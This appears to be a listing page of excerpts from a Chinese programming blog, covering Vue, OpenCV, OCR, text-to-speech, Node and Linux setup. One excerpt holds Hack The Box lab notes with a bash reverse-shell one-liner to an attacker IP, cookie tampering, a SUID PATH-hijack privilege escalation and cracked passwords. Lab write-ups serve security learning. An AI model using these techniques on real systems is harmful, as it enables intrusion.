		Photo sphere viewer全景插件的使用 官网地址：https://photo-sphere-viewer.js.org/guide/npm安装：npm install photo-sphere-viewer 在组件中的使用 首先import
import { Viewer } from 'photo-sphere-viewer'import 'photo-sphere-viewer/dist/photo-sphere-viewer.css'
示例代码 &lt;template&gt; &lt;div id="photosphere" class="photosphere"&gt;&lt;/div&gt; &lt;/template&gt; &lt;script&gt; import { Viewer } from 'photo-sphere-viewer' export default { components: {}, data () { return { panoramadata: null, img: require('../../assets/南_看图王.jpg') // photosphere: 'photosphere' } }, computed: {}, created () { }, mounted () { this.init() }, methods: { init () { this.panoramadata = new Viewer({ container: document.getElementById('photosphere'), panorama: this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a04a0cf88886e0b8412e5aa27364a54b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32e1fa01a8501087a609c7d012b7113f/" rel="bookmark">
			OpenCV深度图转点云
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需要先进行畸变校正，再通过深度图转点云。
相机的相关参数需要事先通过标定获得。
#include &lt;iostream&gt; #include &lt;fstream&gt; #include &lt;opencv2\opencv.hpp&gt; int main() { cv::Mat src = cv::imread("temp/DepthdataZ.tiff", -1); //读取深度图 if (src.empty()) { return -1; } //图片长宽 int image_width = src.cols; int image_height = src.rows; //焦距、中心点 double fx = 3393.866416936082260; double fy = 3392.939030157020625; double cx = 657.783535966715249; double cy = 534.244397069343677; //镜头畸变参数 double k1 = -0.023412391369262; double k2 = -0.456621699069608; double p1 = 0.000738096195024; double p2 = 0.001507735545219; double k3 = 18.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32e1fa01a8501087a609c7d012b7113f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8620aba03a2fbc50c17bb5dedcdcc7ac/" rel="bookmark">
			EDKII编译环境搭建(win11)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目前按照以下步骤已成功Windows11上编译成功，可以参照如下:
1.下载安装需要的工具
VS2017、python3.9、nasm、ASL
VS2017:
可以更改安装位置，其余默认安装。
python3.9:
安装之前勾选添加Path。
nasm下载安装:
在https://www.nasm.us/，下载安装包nasm-2.15.05-installer-x64.exe，安装到C:\nasm下。
ASL下载安装:
https://acpica.org/downloads/binary-tools
点击iASL compiler and Windows ACPI tools(ZIP 2.0 MB)下载即可，把下载的zip文件解压到C:\ASL下。
2.edk2代码下载
git clone https://github.com/tianocore/edk2.git
cd edk2
git clone https://github.com/tianocore/edk2-libc.git
git submodule update --init
3.在edk2根目录添加设置环境变量脚本path.bat:
PATH=%PATH%C:\nasm;C:\ASL;
set WORKSPACE=%CD%
set PYTHON_HOME=C:\Python27
set NASM_PREFIX=C:\nasm\
4.编译
cmd下执行:
path.bat
edksetup.bat
build -p EmulatorPkg/EmulatorPkg.dsc -t VS2017 -b DEBUG/RELEASE -a X64
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42b8970c3b3dbe68ea14b917783c69c0/" rel="bookmark">
			elementui table导出表格
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需要先安装xlsx file-save
npm install --save xlsx file-saver &lt;template&gt; &lt;div&gt; &lt;el-table ref="report-table" :data="tableData"&gt; &lt;/el-table&gt; &lt;/idv&gt; &lt;/template&gt; import * as XLSX from "xlsx"; import FileSaver from 'file-saver'; methods: { exportExcel() { try { const $e = this.$refs['report-table'].$el let $table = $e.querySelector('.el-table__fixed') if (!$table) { $table = $e } const wb = XLSX.utils.table_to_book($table, {raw: true}) const wbout = XLSX.write(wb, {bookType: 'xlsx', bookSST: true, type: 'array'}) FileSaver.saveAs( new Blob([wbout], {type: 'application/octet-stream'}), `统计.xlsx`, ) } catch (e) { if (typeof console !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42b8970c3b3dbe68ea14b917783c69c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/579e7f5d42e8b115e8f584b1cdaf4acb/" rel="bookmark">
			Vue 3 监听元素滚动底部时加载数据并且通过节流来避免过多的事件被触发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.直接上代码，这里用了一个IntersectionObserver API，详细使用方法可以看官方文档
2.IntersectionObserver() 构造函数创建一个新对象，当它检测到目标元素的可见性已超过一个或多个阈值时，该对象将执行指定的回调函数。
3. IntersectionObserver Entry 是一个包含有关目标元素和其相对于根节点的交叉信息的对象。每次观察元素的可见性变化时IntersectionObserver 实例会将一个或多个 IntersectionObserver Entry 对象传递给其回调函数。我们可以检查这些对象的 isIntersecting 属性来确定元素是否进入或离开了视图范围
3.1IntersectionObserver Entry.isIntersecting 是 IntersectionObserver Entry 对象的一个属性，用于指示观察元素与根节点是否相交
3.2当观察元素部分或全部进入根节点（或视口）threshold: 1时，isIntersecting 属性为 true。当观察元素完全离开根节点时，该属性为 false
在懒加载等场景中，我们通常需要在元素进入视图时加载它所需的数据，因此 IntersectionObserver Entry.isIntersecting 属性非常实用
3.1
&lt;template&gt; &lt;div ref="container" style="height: 400px; overflow-y: scroll"&gt; &lt;ul&gt; &lt;li v-for="(item, index) in items" :key="index"&gt;{{ item }}&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/template&gt; &lt;script lang="ts" setup&gt; import { ref, onMounted, onBeforeUnmount } from 'vue' import { debounce } from 'lodash' const isLoading = ref(false) //loading const page = ref(1) const items: any = ref([]) const container: any = ref(null) //ref获取dom元素 const observer: any = ref(null) const fetchData = () =&gt; { isLoading.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/579e7f5d42e8b115e8f584b1cdaf4acb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3841c538ebf45169a19be1ddcae2e83f/" rel="bookmark">
			Mac电脑切换node版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Mac电脑切换不同版本的node
1.首先安装n模块： sudo npm install -g n 2.升级node.js到最新稳定版 sudo n stable 3.升级到最新版 sudo n latest 4.n后面也可以跟随版本号,升级到任意版本 sudo n v0.10.26或sudo n 0.10.26 5.切换使用版本 sudo n 7.10.0 6.删除制定版本 sudo n rm 7.10.0 7.用制定的版本执行脚本 n use 7.10.0 some.js 8.查看所有已安装的node版本 可以查看所有已安装的node版本，可以根据上下和回车选择要使用的版本
sudo n 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ace88d7003e6feb02bd8e99e3150138/" rel="bookmark">
			java: 找不到符号   符号:   方法 of(java.lang.String,java.lang.String)   位置: 接口 java.util.List
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在练习jdk9以后的方法“不可变的List、set、map集合”的时候，由于为我之前的版本是jdk8，所以下载了jdk17,编译过程没有任何问题，但是执行时报了错
错误：（java: 找不到符号 符号: 方法 of(java.lang.String,java.lang.String) 位置: 接口 java.util.List）
当时只是改了jdk版本
并没有改预编译器的jdk版本，这个是预编译时的java版本过低导致的
所以改了下面后就可以了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/745e7c7c8ac80923939e3de031543a9d/" rel="bookmark">
			Please enter your license to use hackbar. Get license
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://addons.mozilla.org/en-US/firefox/addon/hackbar-free/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d8ef99bd3258d389cab29c6db0c2aa5/" rel="bookmark">
			vue3中使用svg图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 项目使用cli创建，只适用于cli项目
一、安装依赖 npm install svg-sprite-loader -D 二、修改vue.config.js const path = require('path') function resolve(dir) { return path.join(__dirname, '.', dir) } module.exports = { chainWebpack: config =&gt; { config.module .rule('svg') .exclude.add(resolve('src/icons')) .end() config.module .rule('icons') .test(/\.svg$/) .include.add(resolve('src/icons')) .end() .use('svg-sprite-loader') .loader('svg-sprite-loader') .options({ symbolId: 'icon-[name]' }) .end() }, }; 3、创建SvgIcon组件，在src/components/SvgIcon/index.vue &lt;template&gt; &lt;svg :class="svgClass" aria-hidden="true"&gt; &lt;use :xlink:href="iconName" /&gt; &lt;/svg&gt; &lt;/template&gt; &lt;script&gt; export default { name: "SvgIcon", props: { iconClass: { type: String, required: true, }, className: { type: String, default: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d8ef99bd3258d389cab29c6db0c2aa5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b833d8cac88924b53f3bf738fe3b7e03/" rel="bookmark">
			YOLOV5改进-手把手教你添加WIOU 实测高效涨点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		步骤1
打开utils/metrics.py,找到以下代码
def bbox_iou(box1, box2, xywh=True, GIoU=False, DIoU=False, CIoU=False, eps=1e-7): # Returns Intersection over Union (IoU) of box1(1,4) to box2(n,4) # Get the coordinates of bounding boxes if xywh: # transform from xywh to xyxy (x1, y1, w1, h1), (x2, y2, w2, h2) = box1.chunk(4, -1), box2.chunk(4, -1) w1_, h1_, w2_, h2_ = w1 / 2, h1 / 2, w2 / 2, h2 / 2 b1_x1, b1_x2, b1_y1, b1_y2 = x1 - w1_, x1 + w1_, y1 - h1_, y1 + h1_ b2_x1, b2_x2, b2_y1, b2_y2 = x2 - w2_, x2 + w2_, y2 - h2_, y2 + h2_ else: # x1, y1, x2, y2 = box1 b1_x1, b1_y1, b1_x2, b1_y2 = box1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b833d8cac88924b53f3bf738fe3b7e03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/067402efb6211dd22fe459a29de519d0/" rel="bookmark">
			windows 文件夹打开默认是小窗口问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 windows 文件夹打开默认是小窗口问题解决 问题解决 windows 文件夹打开默认是小窗口问题解决 不知道误操作了什么，最近点击windows文件夹默认打开的都是小窗口，每次需要点击放大很不方便
问题解决 首先我们先打开任意一个文件夹，只要里面有文件即可
右键点击空白处，然后点击查看，选择大图标
然后点击左上角的文件
选择更改文件夹和搜索选项
点击查看，然后点击应用到文件夹，弹窗点击是
然后我们关闭窗口，再次打开文件夹默认就是打开的了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a4e5e12d82f1f7c6ad6adb3575b1c12/" rel="bookmark">
			详解uni-app框架的生命周期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概要 对uni-app日常开发重要概念梳理和讲解；最基础的内容，开发中虽然是最少用到的，但也是最重要的内容。
一、生命周期函数 在项目运行过程中，各个阶段执行的回调函数成为生命周期钩子函数，如：onLaunch，onMounted函数；
在合适的时机做合适的任务，也就是对应的回调函数执行;
在vue项目中，使用的只是vue实例的生命周期；
uni-app不仅支持vue实例的生命周期，还新增了其他的生命周期，主要是支持微信官方的生命周期函数；
二、uni-app生命周期分类 应用生命周期
官网文档地址
https://uniapp.dcloud.net.cn/collocation/App.html#applifecycle
应用生命周期仅可在App.vue中监听，在页面监听无效果；
App.vue是uni-app的主组件，所有页面都是在App.vue下进行切换的，是页面入口文件。但App.vue本身不是页面，所以不能编写视图元素，没有&lt; template &gt;标签 页面生命周期
官网文档地址
https://uniapp.dcloud.net.cn/tutorial/page.html#lifecycle
支持vue标准的生命周期函数，同时新增了很多其他的生命周期函数
在page目录下配置的页面文件才能生效
uni-app会将 pages.json ==&gt; pages 配置项中的第一个页面，作为当前工程的首页（启动页）
组件生命周期
与vue标准组件的生命周期函数相同；（beforeCreate、created、beforeMount、mounted、beforeUpdate、updated、beforeDestroy、destroyed）
没有页面级新增的onLoad等生命周期函数；
三、uni-app应用生命周期函数 函数名
说明
onLaunch
当uni-app 初始化完成时触发（全局只触发一次）
onShow
当 uni-app 启动，或从后台进入前台显示
onHide
当 uni-app 从前台进入后台
onError
当 uni-app 报错时触发
onUniNViewMessage
对 nvue 页面发送的数据进行监听，可参考 nvue 向 vue 通讯
onUnhandledRejection
对未处理的 Promise 拒绝事件监听函数（2.8.1+）
onPageNotFound
页面不存在监听函数
onThemeChange
监听系统主题变化
onPageNotFound
找不到url对应的页面文件时执行；常用于用户访问不存在页面，引导用户到其他可访问页面
onPageNotFound(() =&gt; { uni.navigateTo({ url:'/pages/404/index' }) }) 四、详解uni-app新增的页面生命周期函数 函数名
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a4e5e12d82f1f7c6ad6adb3575b1c12/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/440fba619ae6e4b05dc987ce1425f823/" rel="bookmark">
			htb(二)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Oopsie proxy 发现不是
这里可以看到 有个login
尝试发现是
/cdn-cgi/login 发现需要admin
Cookie 将id修改为1
34322 记得之前扫到的 /uploads目录
db.php /bin/bash -c 'bash -i &amp;&gt; /dev/tcp/10.10.14.217/5555 0&lt;&amp;1' 反弹到的shell需要把他转换成一个交互式的shell才能切换用户 设置shell为/bin/bash script命令可以用作交互终端会话过程记录,保存用户输入和系统输入的全过程 -q是静默执行 把会话内容丢到黑洞/dev/null
SHELL=/bin/bash script -q /dev/null f2c74ee8db7983851ab2a96a44eb7981 这里可以看到文件属于root 在bugtracker因此 使用rebert执行的话就是root权限
查找属于这个组的
find 看一下这里的执行情况
这里可以看到使用了 cat 去查看/root目录 而且这里并没有使用 绝对路径而是使用的相对路径
root Set owner User ID cat export PATH=/tmp:$PATH cd /tmp echo '/bin/bash' &gt; cat chmod +x cat af13b0bee69f8a877c3faf667f7beacf Vaccine ftp anonymous backup.zip zip2john 741852963 qwerty789 --os-shell python .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/440fba619ae6e4b05dc987ce1425f823/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d23d43acea00bfb6d2b963a86bb2bfd/" rel="bookmark">
			python wesockets异步执行时， 发送信息阻塞 卡住的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题 采用的代码： python + websockets
目前在测试需求过程中，在使用 websockets 异步方式时， 发送一个信息的代码如下：
async def heartbeat(self,websocket): # 发送心跳 while True: await websocket.send('heartbeat') 如上，如果这个写法，可能会导致 send 之后，程序一直 卡住 或者 阻塞，或者感觉变成了 同步的方式。长时间找不到 解决办法
原因 原因不是看的太明确，下面贴地址，大佬们可以自行查看
参考地址：
https://websockets.readthedocs.io/en/stable/faq/asyncio.html
解决方式 在阻塞处增加 await asyncio.sleep(0) 代码如下（示例）：
async def heartbeat(self,websocket): # 发送心跳 while True: await websocket.send('heartbeat') await asyncio.sleep(0) # 增加这一行 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/946c898d3af7f792d90050880b78ded8/" rel="bookmark">
			面向对象3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 面向对象特征--继承 继承是从已有的类中派生出新的类，新的类能吸收已有类的属性和行为， 并能扩展新的能力 子继承父，继承之后可以使用父亲中的功能，不需要重复定义，但是不能对父类中的私有属性进行继承，不允许一个类继承个类，当一个类没有使用extends继承其他类时，这个默认继承Object类。
例子说明
抽象类 抽象类就是当一个类中不含有具体的类容时
抽象方法必须用abstract关键字进行修饰
抽象类不能创建对象
面向对象特征--多态 final关键字 接口 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a73756cf7b6ae0a4e043c0cef5be7d8f/" rel="bookmark">
			ES查询常用语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. ElasticSearch之查询返回结果各字段含义
2. match 查询
3. term查询
4. terms 查询
5. range 范围
6. 布尔查询
6.1 filter加快查询效率的原因
7. boosting query(提高查询)
8. dis_max(最佳匹配查询）
9. 分页
10. 聚合查询【内含实际的demo】
1. ElasticSearch之查询返回结果各字段含义 执行命令：索引库名称/_search
空搜索的结果为：
{ "took": 2,	# 该命令请求花费了多长时间，单位：毫秒。 "timed_out": false,	# 搜索是否超时 "_shards": {	# 搜索分片信息 "total": 3,	# 搜索分片总数 "successful": 3,	# 搜索成功的分片数量 "skipped": 0,	# 没有搜索的分片，跳过的分片 "failed": 0	# 搜索失败的分片数量 }, "hits": {	# 搜索结果集。需要的一切数据都是从hits中获取 "total": 21798,	# 返回多少条数据 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a73756cf7b6ae0a4e043c0cef5be7d8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91353e040c6cd5185ff5dd92ae55ba15/" rel="bookmark">
			c&#43;&#43; 链表实现多项式加法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目要求：
1、请使用链表实现两个多项式的加法运算，其中多项式的项按指数从高到低排列。例如，输入形式为3 2 -1 1 2 0。
测试样例：
样例1：
输入样例：
3 4 2 3 1 2（第一个多项式）
-2 3 4 2 5 1 6 0（第二个多项式）
输出样例：
3 4 5 2 5 1 6 0（求和结果）
代码实现：
//链表 #include &lt;iostream&gt; using namespace std; //类定义 class lianbiao	{ private: int zhen_de_shu_ju;	//zhen_de_shu_ju 数据 int zuo_biao;	//zuo_biao 坐标 class lianbiao* next; public: lianbiao()	//构造函数 { zhen_de_shu_ju =zuo_biao = 0;	next = nullptr;	} ~lianbiao()	//析构函数 { zhen_de_shu_ju = zuo_biao = 0; next = nullptr; } void add(lianbiao n3, lianbiao n4);	//多项式相加函数 void input();	//输入 void output( );	//输出 void shoudong();	//手动析构 }; //函数定义 void lianbiao::add(lianbiao n1, lianbiao n2)	//多项式相加函数 { lianbiao* current1, * current2; lianbiao *current3=new lianbiao; current1 = n1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91353e040c6cd5185ff5dd92ae55ba15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a152b7c53a3a7d6b8e5cd03505384078/" rel="bookmark">
			CentOS7系统安装及基础环境配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、VMware安装CentOS7系统
二、基础环境配置
登录系统设置静态网络
ssh工具连接
修改主机名
关闭防火墙、selinux
安装常用软件包
配置国内YUM源及拓展源
快照
前言 CentOS（Community Enterprise Operating System，中文意思是社区企业操作系统）是Linux发行版之一，它是来自于Red Hat Enterprise Linux依照开放源代码规定释出的源代码所编译而成。由于出自同样的源代码，因此有些要求高度稳定性的服务器以CentOS替代商业版的Red Hat Enterprise Linux使用。两者的不同，在于CentOS完全开源
CentOS官网：The CentOS Projecthttps://www.centos.org/
一、VMware安装CentOS7系统 使用默认配置安装
选择安装
默认英文，可以选择中文
时区设置为上海
默认最小化安装，这里我们也使用最小化安装
默认自动分区，也可以手动配置，这里选择默认
设置完后开始安装
​​ 设置root用户密码，可以不用创建普通用户
设置密码后点两次完成退出
等待安装完成
完成后重启
二、基础环境配置 登录系统设置静态网络 测试能否ping通外网
[root@localhost ~]# vi /etc/sysconfig/network-scripts/ifcfg-ens33 [root@localhost ~]# systemctl restart network
[root@localhost ~]# ping -c www.baidu.com
PING www.a.shifen.com (39.156.66.18) 56(84) bytes of data.
64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=1 ttl=128 time=17.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a152b7c53a3a7d6b8e5cd03505384078/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f468d30f3f63bdd4185d23050c363004/" rel="bookmark">
			Linux文件类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux文件种类 正规文件（regular file）
为 - 的文件，另外依照文件的内容又大致分为：
纯文本文档（ASCII）：比如使用 cat ~/.bashrc，就能把该文件内容读取出来
二进制文件（binary)：可执行文件 scripts （文字型批处理文件不算）
数据格式文件（data）：有些程序运行中会读取某些特定文件格式的文件
比如 linux 在登录时，会将登录的数据记录在 /var/log/wtmp 文件内， 但是使用 cat 时，会读出来乱码，因为是一种特殊格式的文件
笔者唯一没有明白的就是 二进制文件，怎么是 scripts 文件呢？
目录（directory）：d
连接文档（link）：类似 windows 中的快捷方式，用小写（L）的 l 表示
设备与装置文件（device)
与系统周边及存储等相关文件，通常都集中在 /dev 这个目录下，通常又分为两种：
区块（block）设备文档：使用 b 表示
就是一些存储数据，供系统随机存取的接口设备，比如硬盘、软盘等。 可以随机在硬盘的不同区块读写。可以看看 /dev/sda 会发现第一个属性就是 b
字符（character）设备文件：用 c 表示
一些串行端口的接口设备，例如键盘鼠标等。这些设备的特性就是一次性读取的，不能够截断输出。 举例来说，你不可能让鼠标跳跃到另一个画面，而是连续性滑动到另一个地方
数据接口文件（sockets）：用 s 表示
这种类型的文件通常被用在网络上的数据承接。启动程序监听客户端的请求，客户端透过这个 socket 来进行数据的沟通 最常在 /run 或 /tmp 这个目录中
数据传送文件（FIFO,pipe）：使用 p 表示
FIFO 也是一种特殊的文件类型，主要目的在解决多个程序同时存取一个文件所造成的并发错误问题， 是 first-in-first-out 的缩写
Linux目录配置的依据FHS FHS（Filesystem Hierarchy Standard）标准：让使用者可以了解到已安装软件通常放置于哪个目录下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f468d30f3f63bdd4185d23050c363004/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2de96859f69a3d8478572413b9c26feb/" rel="bookmark">
			基于 Node.js 的文本转语音
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于 Node.js 的文本转语音 Node.js 是一个广泛应用的服务端 JavaScript 开发环境，它可以用于各种文本转语音应用。本文将介绍如何使用 Node.js 实现文本转语音。
使用 Node.js 的文本转语音 文本转语音的第一步是安装 Node.js。安装成功后，接下来创建一个文件 text-to-speech.js，编辑并输入以下代码：
// 导入文本转语音模块 const tts = require('@google-cloud/text-to-speech'); // 创建文本转语音客户端对象 const ttsClient = new tts.TextToSpeechClient(); // 设置文本转语音的请求参数 const request = { input: {text: 'Hello, world!'}, // 语言 voice: {languageCode: 'en-US', ssmlGender: 'NEUTRAL'}, // 音频格式 audioConfig: {audioEncoding: 'MP3'}, };	// 执行文本转语音 ttsClient.synthesizeSpeech(request, (err, response) =&gt; { if (err) { console.error('ERROR:', err); return; } // 将语音保存为文件 const writeFile = fs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2de96859f69a3d8478572413b9c26feb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53b74c6995c86a74317bc95180233b06/" rel="bookmark">
			Node.js 如何实现OCR文字识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Node.js 如何实现OCR文字识别 OCR (Optical Character Recognition) 是指用光学技术识别文字图像的技术。随着全新的技术出现，OCR 技术已经发展成为一种非常先进的技术，可以从图片或文档中提取文字，这个技术在文本处理和翻译领域占据一席之地。
本文将介绍如何使用 Node.js 来实现 OCR 技术，并给出一些实用的示例代码。
使用 Node.js 实现 OCR 使用 Node.js 实现 OCR 技术，首先需要安装一些依赖包。也就是说，我们需要安装 tesseract 、node-tesseract 和 node-tesseract-native 等包。
安装 tesseract Tesseract 是一个开源的 OCR 引擎，可以从图像中识别多种文字。首先，我们需要安装 tesseract：
brew install tesseract 安装 node-tesseract 接下来，我们需要安装 node-tesseract：
npm install node-tesseract 安装 node-tesseract-native 最后，我们需要安装 node-tesseract-native：
npm install node-tesseract-native 示例代码示例 接下来，我们将通过一个示例代码来演示如何使用 Node.js 实现 OCR 技术：
const tesseract = require('node-tesseract-native') // 读取图片 const image = `./sample.png` // 设置参数 const options = { l: 'eng', // 识别语言为英文（可以改成其他语言） psm: 6, // 图片模式 } // 执行OCR tesseract.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53b74c6995c86a74317bc95180233b06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21d2ba90a124457955020a7247471840/" rel="bookmark">
			Python 实现语音转文本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python 实现语音转文本 Python可以使用多种方式来实现语音转文本，下面介绍其中两种。
方法一：使用Google Speech API Google Speech API 是 Google 在 2012 年推出的一个 API，可以用于实现语音转文本。使用 Google Speech API 需要安装 SpeechRecognition 库，可以使用 pip 安装：
pip install SpeechRecognition 安装完成后，可以使用下面的代码实现语音转文本：
import speech_recognition as sr # 设置音频文件的位置 audio_file = './audio.wav' # 创建 SpeechRecognition 对象 r = sr.Recognizer() # 读取音频文件 with sr.AudioFile(audio_file) as source: audio = r.record(source) # 识别音频文件 try: print(r.recognize_google(audio, language='zh-CN')) except sr.UnknownValueError: raise 'Google Speech Recognition could not understand audio' except sr.RequestError as e: raise 'Could not request results from Google Speech Recognition Service' 方法二：使用百度语音识别 除了 Google Speech API 外，还可以使用百度语音识别来实现语音转文本。使用百度语音识别需要安装 Baidu-Aip 库，可以使用 pip 安装：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21d2ba90a124457955020a7247471840/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85c63b8089d80a242ab14c14f1aa5dbd/" rel="bookmark">
			Python实现OCR文字识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python实现OCR文字识别 OCR（Optical Character Recognition，光学字符识别）是指通过扫描纸质文档或照片，通过计算机对图像记录的文字进行识别的一种技术。本文介绍如何使用Python来实现OCR文字识别技术。
环境配置 要实现Python的OCR文字识别，首先需要安装OCR软件和相关的包依赖，比如pytesseract和OpenCV。
安装pytesseract pytesseract是一个OCR识别引擎，使用Python调用tesseract-ocr软件，可以实现OCR文字识别。
安装pytesseract：
pip install pytesseract 安装OpenCV OpenCV是一个计算机视觉库，提供了很多图片处理的功能，可以用来识别文字。
安装OpenCV:
pip install opencv-python 实现OCR文字识别 加载图像 首先，使用OpenCV加载图像，将图像转换为灰度图，然后二值化处理图像：
import cv2 # 加载图像 image = cv2.imread('image.jpg') # 转换为灰度图 gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY) # 二值化处理 thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV | cv2.THRESH_OTSU)[1] 识别文字 接着，使用pytesseract调用tesseract-ocr，识别文字：
# 使用pytesseract识别 text = pytesseract.image_to_string(thresh) print(text) 以上代码运行后，就可以得到图片中的文字内容，实现了OCR文字识别。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e20b0ee840f15a8c70c209413a98a08f/" rel="bookmark">
			Python 实现文本转语音
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		：
Python 实现文本转语音 Python 是一种非常强大的脚本语言，可以用来实现各种复杂的应用，其中之一就是文本转语音，即把文字转换成声音来发出。在这里，我们将使用 Python 的 gTTS 库来实现文本转语音的功能。
一、安装 gTTS 库 使用 gTTS 库之前，我们需要先安装 gTTS。安装 gTTS 很简单，我们可以使用 pip 安装：
pip install gTTS 二、使用 gTTS 首先，我们需要引入 gTTS 库：
from gtts import gTTS 然后，我们就可以用 gTTS 把文字转换成音频了：
text = "今天天气真好" tts = gTTS(text, lang='zh') tts.save("today.mp3") 在上面的代码中，text 是需要转换的文本，lang 是文本的语言，save 则是保存转换结果的文件名。
执行之后，我们将看到相应的文件被保存到本地，我们也可以在浏览器中播放音频文件，即可完成文本转语音的功能。
小结 通过上面的简单示例，我们了解到 Python 中如何使用 gTTS 库实现文本转语音的功能，实际上只需要调用几行简单的代码即可完成这一功能，非常方便快捷。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6c60d7854a9f92c74c68cabb1cd627b/" rel="bookmark">
			Mybatis01
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
